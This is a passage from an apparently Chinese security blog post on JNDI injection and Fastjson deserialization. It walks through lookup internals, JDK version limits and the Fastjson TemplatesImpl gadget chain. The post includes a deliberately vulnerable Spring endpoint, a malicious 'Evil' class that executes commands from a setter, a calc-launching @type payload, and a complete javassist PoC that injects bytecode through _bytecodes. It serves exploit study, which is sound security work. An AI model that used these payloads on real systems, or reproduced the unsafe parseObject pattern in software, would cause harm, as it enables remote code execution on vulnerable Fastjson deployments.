class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure><p>LDAP调用了该函数的类有：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring&#x27;s LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure><p>在反序列化漏洞的利用过程中，也可以在readObject寻找可被外部控制的lookup()方法，来触发反序列化漏洞</p><h3 id="利用JNDI-References进行注入（LDAP）"><a href="#利用JNDI-References进行注入（LDAP）" class="headerlink" title="利用JNDI References进行注入（LDAP）"></a>利用JNDI References进行注入（LDAP）</h3><p>JNDI对接LDAP服务时，除了lookup时指定LDAP地址：<code>ldap://xxx</code>外没什么区别。但是由于上面提到的安全管理器，LDAP不受<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，加上新加入了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>，所以利用版本不同。</p><p>这里总结一张JNDI注入对版本要求的表：</p><table><thead><tr><th>JNDI服务</th><th>需要的安全属性值</th><th>version</th><th>备注</th></tr></thead><tbody><tr><td>RMI</td><td>java.rmi.server.useCodebaseOnly&#x3D;&#x3D;false</td><td>jdk&gt;&#x3D;6u45、7u21 true</td><td>true时禁用自动远程加载类</td></tr><tr><td>RMI、CORBA</td><td>com.sun.jndi.rmi.object.trustURLCodebase&#x3D;&#x3D;true</td><td>jdk&gt;&#x3D;6u141、7u131、8u121 false</td><td>flase禁止通过RMI和CORBA使用远程codebase</td></tr><tr><td>LDAP</td><td>com.sun.jndi.ldap.object.trustURLCodebase&#x3D;&#x3D;true</td><td>jdk&gt;&#x3D;8u191、7u201、6u211 、11.0.1 false</td><td>false禁止通过LDAP协议使用远程codebase</td></tr></tbody></table><h2 id="JNDI-lookup-解析"><a href="#JNDI-lookup-解析" class="headerlink" title="JNDI lookup()解析"></a>JNDI lookup()解析</h2><p><code>java.naming.InitialContext.java#lookup()</code>：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215185303011.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215185303011.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221215185303011"></p><p>持续跟进lookup到<code>com.sun.jndi.rmi.registry.RegistryContext.class</code>，lookup：lookup获取RMI服务器上的对象引用，赋值给var2(拷贝对象到注册表)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215191945111.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215191945111.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221215191945111"></p><p>随后执行decodeObject:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215192036957.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215192036957.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221215192036957"></p><p>decodeObject会判断RMIServer绑定的类是否为RemoteReference的子类(var1)，是的话用getReference()获取Reference类，赋值给var3</p><p>随后执行NamingManager.getObjectInstance()，在此函数内执行了getObjectFactoryReference</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193329571.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193329571.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221215193329571"></p><p>跟进getObjectFactoryReference():可以看到第一个try并没有用到codebase，意味着首先是在本地寻找类，如果没有才执行第二个try加载codebase上的远程类。最后用newInstance()实例化</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193544410.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215193544410.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221215193544410"></p><p><code>clas=helper.loadClass(factoryName)</code>采用反射的方式获取类名。在if判断里根据Reference的ClassName和codebase(如<code>rmi://ip:port/</code>)来加载factory类</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215200931098.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221215200931098.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221215200931098"></p><h2 id="Fastjson前置知识"><a href="#Fastjson前置知识" class="headerlink" title="Fastjson前置知识"></a>Fastjson前置知识</h2><h3 id="Fastjson使用"><a href="#Fastjson使用" class="headerlink" title="Fastjson使用"></a>Fastjson使用</h3><p>pom.xml添加fastjson依赖，jdbcRowSetImpl链需要fastjson&lt;&#x3D;1.2.24</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以利用<code>JSON.toJSONString()</code>将对象<strong>序列化</strong>为json字符串。</p><p>反序列化：<code>JSON.parseObject()</code>、<code>JSON.parse</code></p><p>parseObject()返回fastjson.JSONObject类，而parse返回类User</p><p>在parseObject构造函数指定为Object类，可以起到parse的作用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsons</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjsonvul.User\&quot;,\&quot;name\&quot;:\&quot;godown\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(jsons,Object.class);</span><br></pre></td></tr></table></figure><ul><li><code>@type</code>参数指定反序列化后的类名，然后自动调用该类的setter、getter以及构造函数</li></ul><blockquote><p>如果不知道getter,setter，可以看一下javaBean:<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</a></p></blockquote><p>测试：</p><p>恶意类Evil：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="built_in">this</span>.cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Evil&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmd=&#x27;&quot;</span> + cmd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server:</p><p>springboot起的服务器，记得导入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastVuln1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/fast1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">FastVuln1</span><span class="params">(<span class="meta">@RequestParam(name=&quot;user&quot;)</span> String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(user,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@RestController</code>的意思就是controller里面的方法都以json格式输出</p><p><code>@RequestMapping</code>注解在FastVuln1方法处，表示映射类到url路径fast1，能处理所有HTTP请求</p><p><code>@RequestParam</code>注解在String cmd参数处，表示接收URL中的cmd参数，接收不到会报错</p><blockquote><p>注解：<a href="https://www.cnblogs.com/tomingto/p/11377138.html">https://www.cnblogs.com/tomingto/p/11377138.html</a></p></blockquote><p>向url：<code>http://localhost:xxx/fast1</code> POST传参 payload：<code>user = &#123;&quot;@type&quot;:&quot;org.example.Evil&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;</code></p><blockquote><p>我用get方式传参出现了错误，会报<code>The valid characters are defined in RFC 7230 and RFC 3986</code>异常，url中不允许包含@或者一些其他的特殊字符</p><p>fastJson默认不反序列化私有属性，parseObject加上<code>Feature.SuppertNonPublicField</code>对私有属性进行反序列化</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221216225418882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221216225418882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221216225418882"></p><h3 id="getter、setter-源码分析"><a href="#getter、setter-源码分析" class="headerlink" title="getter、setter 源码分析"></a>getter、setter 源码分析</h3><p>在javaBeanInfo#build()方法，利用反射将 反序列化后<code>@type</code>指定类 的方法、属性、构造器存入buildClass,declaredFields数组和method数组</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217191753814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217191753814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221217191753814"></p><p>buile()方法里面还有if 判断构造函数是否存在&amp;&amp;传入类是否为抽象类或者接口</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217192135930.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217192135930.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221217192135930"></p><p>下面看对method的判断（也就是setter的定义)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217193903768.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217193903768.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221217193903768"></p><p>方法名开头是否为set</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194023133.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194023133.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221217194023133"></p><ol><li>方法名长度不能小于4</li><li>不能是静态方法</li><li>返回的类型必须是void 或者是自己本身</li><li>传入参数个数必须为1</li><li>方法开头必须是set</li></ol><p>在if(methodName.startWith(“set”))内，charAt(3)返回method第四个字符，根据ascii码进行截断</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194849987.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217194849987.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221217194849987"></p><p>如果经过截断还是找不到属性或者为Boolean，就在截断后的变量前加is，然后对相应字符大写进行拼接，然后重新寻找属性</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195212008.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195212008.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221217195212008"></p><p>最后将相应属性方法等内容添加到fieldInfo</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195452522.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217195452522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221217195452522"></p><p>getter的判断也差不多，直接给出要求：</p><ol><li>方法名长度不小于4</li><li>不能是静态方法</li><li>方法名要get开头同时第四个字符串要大写</li><li>方法返回的类型必须继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li><li>传入的参数个数需要为0</li></ol><h2 id="fastJson-TemplatesImpl链"><a href="#fastJson-TemplatesImpl链" class="headerlink" title="fastJson TemplatesImpl链"></a>fastJson TemplatesImpl链</h2><p>版本：fastjson 1.2.22-1.2.24</p><p>TemplatesImpl链构造的恶意类为Object，但是在fastJson序列化中，只有两种方式能接收Object类（并且要设置Feature.SupportNonPublicField，恢复private属性）,但是在1.2.22才出现该属性，1.2.24后又加了很多黑名单和白名单</p><p>我们构造的PoC中有private的成员变量<code>_bytecodes</code>和<code>_name</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> parseObject(input,Object.class,Feature.SupportNonPublicField)<span class="comment">//不设置Object会返回JSONObject</span></span><br><span class="line"><span class="number">2.</span> parse(input,Feature.SupportNonPublicField)</span><br></pre></td></tr></table></figure><p>TemplatesImpl链有两种，一种是newTransformer()作为入口；一种是getOutputProperties()作为入口，这里用到的是第二种</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl<span class="selector-id">#getOutputProperties</span>() -&gt; TemplatesImpl<span class="selector-id">#newTransformer</span>() -&gt;TemplatesImpl<span class="selector-id">#getTransletInstance</span>() -&gt; TemplatesImpl<span class="selector-id">#defineTransletClasses</span>()-&gt; TransletClassLoader<span class="selector-id">#defineClass</span>()</span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonpoc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clas</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        clas.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        clas.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">EvilCode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(EvilCode);</span><br><span class="line">        <span class="keyword">return</span> EvilCode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">GADGAT_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil</span> <span class="operator">=</span> fastjsonpoc1.generateEvil();</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>poc1类用来构造恶意字节码。ClassPool.getDefult()获取默认类池后，创建类Evil</p><p>设置要继承的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br></pre></td></tr></table></figure><p>创建一个空的类初始化器（静态构造函数）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br></pre></td></tr></table></figure><p>向构造函数里加入cmd，也就是exec函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor.insertBefore(cmd);</span><br></pre></td></tr></table></figure><p>设置加载AbstractTranslet类的搜索路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName())</span><br></pre></td></tr></table></figure><p>将编译的类创建为<code>.class</code> 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.writeFile(<span class="string">&quot;./&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote><ul><li>TemplatesImpl加载的字节码必须为AbstractTranslet子类，因为defineTransletClasses里会对传入类进行一次判断</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if this is the main class</span></span><br><span class="line"><span class="comment">// ABSTRACT_TRANSLET指com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类</span></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造好的Evil类转为字节码后base64就能传入<code>_bytecodes[]</code>了</p><blockquote><p>String PoC经过JSON.parseObject序列化后约为(因为设置不了私有属性的缘故，这里定义了一个setFieldValue方法模拟)：</p></blockquote><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;evil&#125;);<span class="comment">//evil为恶意字节码</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a.b&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, &#123;&#125;);<span class="comment">//</span></span><br><span class="line">setFieldValue(obj,<span class="string">&quot;_outputProperties&quot;</span>,&#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><code>_tfactory</code>也可以传入new TransformerFactoryImpl()，_tyfactory为空的话会根据类属性自动创建TransformerFactoryImpl实例，但是只有用fastjson&#x2F;serializer进行序列化的时候可以不传入</p><p>因为有去除下划线的操作，属性都能加上<code>_</code>。指定了allowedProtocols&#x3D;all，也就是序列化支持的协议</p><p>弹计算器图：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217222126890.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221217222126890.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221217222126890"></p><p>关于fastjson反序列化调用javaBean的setter、getter、构造函数请看<a href="http://wjlshare.com/archives/1512%EF%BC%88%E4%B8%8D%E8%BF%87%E6%88%91%E4%B8%8D%E7%9C%8B">http://wjlshare.com/archives/1512（不过我不看</a></p><ul><li>源码大致原理:</li></ul><p>json序列化入口：JSON.parseObject(),转到DefaultJSONParser.parseObject(),该方法下的一个if判断，key&#x3D;&#x3D;<code>JSON.DEFAULT_TYPE_KEY</code> 同时 没有开启<code>Feature.DisableSpecialKeyDetect</code> 就会进入判断，利用loadClass，加载类对象</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204845168.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204845168.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 